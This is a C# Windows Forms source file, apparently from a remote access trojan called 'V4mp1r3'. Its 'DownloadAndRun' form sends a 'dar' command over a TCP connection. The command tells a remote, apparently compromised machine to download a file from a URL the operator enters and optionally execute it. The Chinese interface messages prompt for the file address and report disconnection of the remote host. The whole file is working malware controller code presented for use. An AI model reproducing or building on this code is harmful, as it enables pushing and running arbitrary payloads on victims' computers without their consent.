using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace V4mp1r3
{
    public partial class frmDownloadAndRun : Form
    {
        public frmDownloadAndRun(TcpClient client)
        {
            InitializeComponent();
            this.client = client;
        }
        TcpClient client;
        bool canclose = true;
        private void button1_Click(object sender, EventArgs e)
        {
            Thread thread1 = new Thread(new ThreadStart(DownloadAndRun));
            thread1.Start();
        }
        private void DownloadAndRun()
        {
            if (textBox1.Text == "")
            {
                MessageBox.Show("请输入文件地址！", "提示");
            }
            else if (textBox2.Text == "")
            {
                MessageBox.Show("请输入下载后文件名！", "提示");
            }
            else if (checkBox1.Checked == false)
            {
                try
                {
                    button1.Enabled = false;
                    canclose = false;
                    NetworkStream clientStream = client.GetStream();
                    BinaryWriter bw = new BinaryWriter(clientStream);
                    bw.Write("dar," + "0," + textBox1.Text + "," + @textBox2.Text);
                    string receive = null;
                    BinaryReader br = new BinaryReader(clientStream);
                    receive = br.ReadString();
                    button1.Enabled = true;
                    canclose = true;
                    MessageBox.Show(receive, "提示");
                }
                catch
                {
                    button1.Enabled = true;
                    canclose = true;
                    MessageBox.Show("远程主机已断开连接！", "提示");
                }
            }
            else
            {
                try
                {
                    button1.Enabled = false;
                    canclose = false;
                    NetworkStream clientStream = client.GetStream();
                    BinaryWriter bw = new BinaryWriter(clientStream);
                    bw.Write("dar," + "1," + textBox1.Text + "," + @textBox2.Text);
                    string receive = null;
                    BinaryReader br = new BinaryReader(clientStream);
                    receive = br.ReadString();
                    button1.Enabled = true;
                    canclose = true;
                    MessageBox.Show(receive, "提示");
                }
                catch
                {
                    button1.Enabled = true;
                    canclose = true;
                    MessageBox.Show("远程主机已断开连接！", "提示");
                }
            }
        }

        private void frmDownloadAndRun_FormClosing(object sender, FormClosingEventArgs e)
        {
            if(canclose)
            {

            }
            else
            {
                e.Cancel = true;
            }
        }
    }
}
